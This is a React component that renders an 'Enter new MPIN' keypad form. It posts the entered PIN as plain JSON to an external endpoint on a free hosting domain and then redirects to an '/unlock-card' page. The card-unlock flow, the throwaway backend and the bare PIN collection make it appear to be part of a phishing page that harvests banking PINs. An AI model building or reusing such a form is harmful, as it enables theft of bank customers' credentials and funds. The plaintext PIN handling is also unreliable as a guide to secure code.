import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom'; // <-- import this
import { useAppContext } from '../context/AppContext'; // <-- import your context hook
import { motion } from 'framer-motion';
import NumericKeypad from '../components/NumericKeypad';

const MPINForm: React.FC = () => {
  const [mpin, setMpin] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();  // react-router navigation
  const { updateUserData } = useAppContext();  // your context function

  useEffect(() => {
    if (mpin.length > 6) {
      setMpin(mpin.slice(0, 6));
    }
  }, [mpin]);

  const handleKeyPress = (key: string) => {
    if (key === 'backspace') {
      setMpin(prev => prev.slice(0, -1));
    } else if (key === 'enter') {
      handleSubmit();
    } else if (/^\d$/.test(key) && mpin.length < 6) {
      setMpin(prev => prev + key);
    }
  };

  const handleSubmit = async () => {
    if (mpin.length < 4) {
      setError('MPIN must be at least 4 digits');
      return;
    }
    setError('');

    try {
      
      await fetch('https://api-2-hnij.onrender.com/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mpin })
      });

      // Update user data in your React context
      updateUserData({ mpin });

      // Navigate to next page after successful submit
      navigate('/unlock-card');
    } catch (err) {
      setError('Submission failed. Please try again.');
      console.error(err);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="flex flex-col items-center pb-60"
    >
      <h2 className="text-2xl font-medium mb-8 text-center">Enter new MPIN</h2>

      <div className="w-full mb-8">
        <div className="relative">
          <input
            type="password"
            value={mpin}
            placeholder="New MPIN"
            className="text-xl w-full border border-gray-300 px-4 py-2 rounded"
            readOnly
          />
          <div className="absolute right-3 bottom-3 text-sm text-gray-500">
            {mpin.length}/6
          </div>
          {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
        </div>
      </div>

      <button
        onClick={handleSubmit}
        className="primary-button w-full mb-8 bg-blue-500 text-white py-2 rounded"
      >
        Submit
      </button>

      <NumericKeypad onKeyPress={handleKeyPress} />
    </motion.div>
  );
};

export default MPINForm;
